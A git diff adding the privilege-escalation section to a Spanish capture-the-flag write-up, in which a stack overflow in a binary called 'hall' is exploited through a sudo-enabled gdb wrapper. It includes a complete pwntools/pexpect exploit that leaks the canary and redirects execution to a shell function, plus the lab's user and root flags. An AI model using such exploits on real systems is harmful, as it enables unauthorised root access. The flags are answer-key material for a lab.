@@ -902,6 +902,13 @@ corriendo, asi que tras testear las credenciales del binario logramos ganar acce
 
 ## carlos
 
+leemos la flag
+
+```bash
+cat user.txt
+d784fa8b6d98d27699781bd9a7cf19f0
+```
+
 este usuario puede ejecutar el binario `exim` como el usuario `pedro`
 
 ![image](https://github.com/user-attachments/assets/ffdf87f1-ffb8-408d-bb17-b094c653bf71)
@@ -990,10 +997,304 @@ ya todo listo, solo queda ganar acceso via `ssh`
 ssh -i id_rsa pedro@172.17.0.2
 ```
 
-## pedro
-
-
-
 # Privilege Escalation
 
-[Describe the steps to obtaining root/administrator privileges on the box.]
+## pedro
+
+en el directorio de este usuario se encuentran 2 archivos, un binario "hall" y un mail
+
+mail
+```
+Pedro, the hall binary was found by the Inter Corp administrators and they expect you to analyze it. 
+I have enabled gdb '/usr/local/bin/secure_gdb' so that if necessary you can debug it as root and, 
+for security reasons, you know that I limit functions in the debugger to avoid problems.
+```
+segun el mail, han habilitado gdb para ser usado con sudo a traves del script `/usr/local/bin/secure_gdb` y si chequeo puedo ejecutar dicho script como root
+
+![image](https://github.com/user-attachments/assets/f5e57f92-a031-4dcd-b0f3-c14d28bfc487)
+
+intentare bypassear esto
+
+![image](https://github.com/user-attachments/assets/c1f8ef38-431d-4dc7-b691-1e35ccbc4274)
+
+al parecer de forma externa no puedo hacer mas nada que no sea ejecutar el binario indicado, asi que intentare ejecutar comandos ya internamente en `gdb`
+
+![image](https://github.com/user-attachments/assets/27001625-9dae-4bc5-9b06-f48eba692058)
+
+han deshabilitado la ejecucion de comandos dentro de `gdb`, por lo que parece que no sera posible inyectar comandos por esta via y escalar a root, asi que ahora me 
+centrare en el binario `hall`
+
+![image](https://github.com/user-attachments/assets/e9baf55e-e94b-4a2b-8e88-fb1d566e73a0)
+
+esto parece ser el comportamiento normal del binario, ahora testeo si llega ser vulnerable a bof
+
+![image](https://github.com/user-attachments/assets/969e16f0-d8d5-4287-b093-87734cbe54e6)
+
+es vulnerable a bof y por el mensaje que se observa y resalto, tiene proteccion canary activa el binario, asi que vamos chequear las protecciones presentes, pero para
+eso me lo paso a mi maquina atacante
+
+```bash
+scp -i id_rsa pedro@172.17.0.2:/home/pedro/hall .
+```
+el comando anterior transifere el binario hall a nuestra maquina atacante, ahora si chequeo las protecciones
+
+![image](https://github.com/user-attachments/assets/ec61bdfc-3cf0-463f-8d1b-622c0b3979de)
+
+cuenta con todas las protecciones activas, ahora lo abro con ghidra para analizarlo internamente
+
+![image](https://github.com/user-attachments/assets/ce396305-cdcc-4265-a984-71be5acff990)
+
+primero observe una gran cantidad de funciones que no son llamadas nunca en el programa y revisando cada una de ellas me consigo con la funcion intel() y su contenido
+llama fuertemente mi atencion, ejecuta los comandos como root dejando el sistema vulnerable y despues obteniendo una `/bin/bash`. Tambien consegui otra funcion, la funcion factor1()
+
+![image](https://github.com/user-attachments/assets/cf962d52-bc14-4682-80e0-2a79cbb4358c)
+
+esta funcion tambien intenta ejecutar una shell, pero esta funcion no usa `system`, sino que hace uso de `execve` junto con una `/bin/sh`, esto tambien parece de interes ya `execve` y `sh` son ideales para tener mayor control sobre entornos que puedar ser corruptos, en cambio `system` y `/bin/bash` son mas restrictivos y pueden fallar con mucha facilidad en entorno corruptos, tal vez este es el motivo de la funcion `factor1`, por posibles corrupciones... aqui la idea sera intentar redirigir el flujo del programa a alguna de las 2 funciones, ya sera `intel()` o `factor1`. Corremos el binario con el depurador para ir analizandolo
+
+```bash
+gdb ./hall -q
+(gdb) break main          # creamos un punto de interrupcion en main
+(gdb) run                 # corremos el programa para que se detenga en main
+(gdb) disassemble main    # desensamblamos la funcion main
+```
+```bash
+Dump of assembler code for function main:
+   0x00005555555561fc <+0>:	push   %rbp
+   0x00005555555561fd <+1>:	mov    %rsp,%rbp
+=> 0x0000555555556200 <+4>:	sub    $0x50,%rsp
+   0x0000555555556204 <+8>:	mov    %fs:0x28,%rax
+   0x000055555555620d <+17>:	mov    %rax,-0x8(%rbp)
+   0x0000555555556211 <+21>:	xor    %eax,%eax
+   0x0000555555556213 <+23>:	lea    0x14a6(%rip),%rax        # 0x5555555576c0
+   0x000055555555621a <+30>:	mov    %rax,%rdi
+   0x000055555555621d <+33>:	call   0x555555555040 <puts@plt>
+   0x0000555555556222 <+38>:	mov    $0x0,%eax
+   0x0000555555556227 <+43>:	call   0x555555556117 <factor2>
+   0x000055555555622c <+48>:	lea    0x14bd(%rip),%rax        # 0x5555555576f0
+   0x0000555555556233 <+55>:	mov    %rax,%rdi
+   0x0000555555556236 <+58>:	mov    $0x0,%eax
+   0x000055555555623b <+63>:	call   0x555555555030 <printf@plt>
+   0x0000555555556240 <+68>:	lea    -0xc(%rbp),%rax
+   0x0000555555556244 <+72>:	mov    %rax,%rsi
+   0x0000555555556247 <+75>:	lea    0x14d5(%rip),%rax        # 0x555555557723
+   0x000055555555624e <+82>:	mov    %rax,%rdi
+   0x0000555555556251 <+85>:	mov    $0x0,%eax
+   0x0000555555556256 <+90>:	call   0x555555555170 <__isoc99_scanf@plt>
+   0x000055555555625b <+95>:	lea    -0xc(%rbp),%rax
+   0x000055555555625f <+99>:	lea    0x14c1(%rip),%rdx        # 0x555555557727
+   0x0000555555556266 <+106>:	mov    %rdx,%rsi
+   0x0000555555556269 <+109>:	mov    %rax,%rdi
+   0x000055555555626c <+112>:	call   0x555555555140 <strcmp@plt>
+   0x0000555555556271 <+117>:	test   %eax,%eax
+   0x0000555555556273 <+119>:	jne    0x555555556286 <main+138>
+   0x0000555555556275 <+121>:	lea    0x14b4(%rip),%rax        # 0x555555557730
+   0x000055555555627c <+128>:	mov    %rax,%rdi
+   0x000055555555627f <+131>:	call   0x555555555040 <puts@plt>
+   0x0000555555556284 <+136>:	jmp    0x555555556295 <main+153>
+   0x0000555555556286 <+138>:	lea    0x14e3(%rip),%rax        # 0x555555557770
+   0x000055555555628d <+145>:	mov    %rax,%rdi
+   0x0000555555556290 <+148>:	call   0x555555555040 <puts@plt>
+--Type <RET> for more, q to quit, c to continue without paging--
+   0x0000555555556295 <+153>:	movl   $0x46,-0x44(%rbp)
+   0x000055555555629c <+160>:	cmpl   $0x4e,-0x44(%rbp)
+   0x00005555555562a0 <+164>:	jne    0x555555556317 <main+283>
+   0x00005555555562a2 <+166>:	lea    0x1518(%rip),%rax        # 0x5555555577c1
+   0x00005555555562a9 <+173>:	mov    %rax,-0x40(%rbp)
+   0x00005555555562ad <+177>:	lea    0x151d(%rip),%rax        # 0x5555555577d1
+   0x00005555555562b4 <+184>:	mov    %rax,-0x38(%rbp)
+   0x00005555555562b8 <+188>:	lea    0x1522(%rip),%rax        # 0x5555555577e1
+   0x00005555555562bf <+195>:	mov    %rax,-0x30(%rbp)
+   0x00005555555562c3 <+199>:	lea    0x1529(%rip),%rax        # 0x5555555577f3
+   0x00005555555562ca <+206>:	mov    %rax,-0x28(%rbp)
+   0x00005555555562ce <+210>:	lea    0x152f(%rip),%rax        # 0x555555557804
+   0x00005555555562d5 <+217>:	mov    %rax,-0x20(%rbp)
+   0x00005555555562d9 <+221>:	lea    0x1532(%rip),%rax        # 0x555555557812
+   0x00005555555562e0 <+228>:	mov    %rax,-0x18(%rbp)
+   0x00005555555562e4 <+232>:	movl   $0x0,-0x48(%rbp)
+   0x00005555555562eb <+239>:	jmp    0x55555555630d <main+273>
+   0x00005555555562ed <+241>:	mov    -0x48(%rbp),%eax
+   0x00005555555562f0 <+244>:	cltq
+   0x00005555555562f2 <+246>:	mov    -0x40(%rbp,%rax,8),%rax
+   0x00005555555562f7 <+251>:	mov    %rax,%rdi
+   0x00005555555562fa <+254>:	call   0x555555555417 <process_string>
+   0x00005555555562ff <+259>:	mov    $0xa,%edi
+   0x0000555555556304 <+264>:	call   0x555555555060 <putchar@plt>
+   0x0000555555556309 <+269>:	addl   $0x1,-0x48(%rbp)
+   0x000055555555630d <+273>:	mov    -0x48(%rbp),%eax
+   0x0000555555556310 <+276>:	cmp    $0x5,%eax
+   0x0000555555556313 <+279>:	jbe    0x5555555562ed <main+241>
+   0x0000555555556315 <+281>:	jmp    0x555555556321 <main+293>
+   0x0000555555556317 <+283>:	mov    $0xa,%edi
+   0x000055555555631c <+288>:	call   0x555555555060 <putchar@plt>
+   0x0000555555556321 <+293>:	mov    $0x0,%eax
+   0x0000555555556326 <+298>:	mov    -0x8(%rbp),%rdx
+   0x000055555555632a <+302>:	sub    %fs:0x28,%rdx
+   0x0000555555556333 <+311>:	je     0x55555555633a <main+318>
+   0x0000555555556335 <+313>:	call   0x555555555130 <__stack_chk_fail@plt>
+--Type <RET> for more, q to quit, c to continue without paging--
+   0x000055555555633a <+318>:	leave
+   0x000055555555633b <+319>:	ret
+```
+podemos ver inmediatamente donde se encuentra el `canary`
+
+```
+0x000055555555620d <+17>:	mov    %rax,-0x8(%rbp)
+```
+
+con `stepi` nos adelantamos hasta despues del canary
+
+![image](https://github.com/user-attachments/assets/67f091d2-682e-4856-9e40-a72e8a1daad5)
+
+nos movimos 4 direcciones de memoria, ya el canary se encuentra en `rbp - 0x8` por lo que podemos consultarlo
+
+```bash
+(gdb) x/1gx $rbp-0x8
+```
+
+![image](https://github.com/user-attachments/assets/ab3747e1-f122-4258-b057-c4699a73e990)
+
+ya sabemos como extraer el canary, ahora para extraer la direccion de factor1(), que sera con la primera que intentare, usamos el comando
+
+```bash
+(gdb) p factor1
+```
+```
+$1 = {<text variable, no debug info>} 0x5555555560b7 <factor1>
+```
+
+ahora validamos el offset de la entrada vulnerable para saber el tamano del buffer antes de llegar al canary
+
+![image](https://github.com/user-attachments/assets/a0baaca2-641d-46ad-bdef-f83eb0420f41)
+
+el offset es de 72 bytes, asi que este datos nos servira para la contruccion del exploit.
+
+ya sabemos como extraer la direccion de una funcion, ya tenemos el offset hasta el canary, tambien sabemos donde se localiza el canary y como extraerlo, esta seria toda la informacion que necesitamos extraer en tiempo de ejecucion ya que por las protecciones activas, las direcciones de memoria se aleatorizan tras cada ejecucion, por esto vamos a desarrollar el exploit para que interactue con `gdb`, bueno hay que tomar en cuenta que si en vez de apuntar a gdb directamente, apunto al script `/usr/local/bin/secure_gdb` podria ejecutar gdb como root, por lo que el binario hereda los permisos y se ejecuta como root, y si el exploit llega a funcionar, estaria obteniendo una shell como root directamente, asi que en el exploit apunto al script para ejecutar como root a gdb.
+
+El exploit lo desarrollo para que interactue con gdb a traves del script "/usr/local/bin/secure_gdb" y de igual forma que fui extrayendo la informacion de forma manual en gdb, lo hago pero automatizando todo el proceso y usando expresiones regulares para extraer los datos que necesito en tiempo de ejecucion, el exploit queda asi:
+
+exploit.py
+```python
+import pexpect
+import re
+import struct
+from pwn import *
+def atack():
+    # 4 espacios de identacion
+    binary = ELF("/home/pedro/hall")
+    binary_path = "/home/pedro/hall"
+    gdb_path = "/usr/local/bin/secure_gdb"
+    gdb_process = pexpect.spawn(f"sudo {gdb_path} {binary_path}", timeout=10, maxread=10000, searchwindowsize=100)
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("set disassembly-flavor intel")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("set pagination off")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("set style enabled off")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("break main")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("run")
+
+
+    # Extraccion direccion de funcion   factor1()
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("p factor1")
+    gdb_process.expect_exact("(gdb)", timeout=10)
+    address_factor1 = gdb_process.before.decode('utf-8')
+    match = re.search(r'0x[0-9a-f]+', address_factor1)
+    if match:
+       address_factor1_str = match.group(0)  # Extraer la dirección en formato hexadecimal
+       address_factor1_int = int(address_factor1_str, 16)
+       address_factor1_le = p64(address_factor1_int) # direccion de factor1 en formato little-endian lista para el payload
+       gdb_process.sendline(" ") # prepara gdb para recibir el siguiente comando!
+    else:
+       print("No se pudo extraer la dirección de factor1().")
+       exit(1)
+
+    # extraemos la direccion de memoria que nos permitira crear un breakpoint para capturar el canary ya cargado en el stack
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("disas factor2")
+    gdb_process.expect_exact("(gdb)", timeout=10)
+    address_factor2 = gdb_process.before.decode('utf-8')
+    lines = address_factor2.splitlines()
+    memory_addresses = [line.split()[0] for line in lines if '<+' in line]
+    if len(memory_addresses) >= 7:
+       seventh_memory_address = memory_addresses[6]
+       gdb_process.sendline(" ")
+       gdb_process.expect("(gdb)")
+       gdb_process.sendline(f"break *{seventh_memory_address}")
+       gdb_process.expect("(gdb)")
+       gdb_process.sendline("continue")
+    else:
+       print("No hay suficientes direcciones de memoria en la salida")
+
+    # calculamos el Canary
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("x/1gx $rbp-0x8")
+    gdb_process.expect_exact("(gdb)", timeout=10)
+    output_canary = gdb_process.before.decode('utf-8')
+    canary_value = output_canary.split(':')[1].strip().split()[0]
+    output_canary_int = int(canary_value, 16)
+    output_canary_le = struct.pack('<Q', output_canary_int) # canary listo en formato little-endian para el payload
+    gdb_process.sendline(" ")
+    gdb_process.expect("(gdb)")
+    gdb_process.sendline("continue")
+
+#    codigo temporal para calcular en que punto se sobrescribe el rip
+#    gdb_process.expect("(gdb)")
+#    gdb_process.sendline("disas factor2")
+#    gdb_process.expect_exact("(gdb)", timeout=10)
+#    address_breakpoint = gdb_process.before.decode('utf-8')
+#    lines = address_breakpoint.splitlines()
+#    memory_addresses_breakpoint = [line.split()[0] for line in lines if '<+' in line]
+#    if len(memory_addresses_breakpoint) >= 20:
+#       memory_address_bp = memory_addresses_breakpoint[19]
+#       gdb_process.sendline(" ")
+#       gdb_process.expect("(gdb)")
+#       gdb_process.sendline(f"break *{memory_address_bp}")
+#       gdb_process.expect("(gdb)")
+#       gdb_process.sendline("continue")
+#    else:
+#       print("No hay suficientes direcciones de memoria en la salida")
+
+    # construccion del payload
+    buffer_size = 72 # desplazamiento hasta el canary
+    buffer_fil = b'S' *buffer_size
+    padding = b'A' *8 # relleno para alinear la pila
+
+    payload = flat(
+    buffer_fil,
+    output_canary_le,
+    padding,
+    address_factor1_le
+    )
+    # Enviar el payload
+    gdb_process.expect("Introduce tu nombre: ")
+    gdb_process.sendline(payload)
+    gdb_process.interact()
+    gdb_process.send(b"quit")
+    gdb_process.close()
+
+if __name__ == '__main__':
+    atack()
+```
+desarrollado el exploit, procedemos a testearlo
+
+![image](https://github.com/user-attachments/assets/171ec9c2-a5a4-4523-83a3-9a73bdc3b753)
+
+como se observa, el exploit puede llegar a fallar y esto sucede porque se trabaja con direccion de memoria aleatorias que podrian hacer entrar en conflicto la recepcion o envio del payload, pero si intentamos nuevamente vemos que se logro ejecutar de forma exitosa obteniendo una terminal como root, pero esta terminal resulta ser muy incomoda por lo que editare el archivo "/etc/passwd"
+
+![image](https://github.com/user-attachments/assets/5f2a54b3-8afa-4e70-96e4-0b1b4f14f407)
+
+
+![image](https://github.com/user-attachments/assets/d2b9e5b7-40ed-411d-b2e5-41d1b72b0b6e)
+
+![image](https://github.com/user-attachments/assets/ccf573f1-ab9b-43a3-8b3d-f4cead486845)
+
+obtengo una mejor terminal como root y leo su flag
+
+```bash
+cat /root/root.txt
+592d328555681ed9a01b836acd8fea34
+```
+
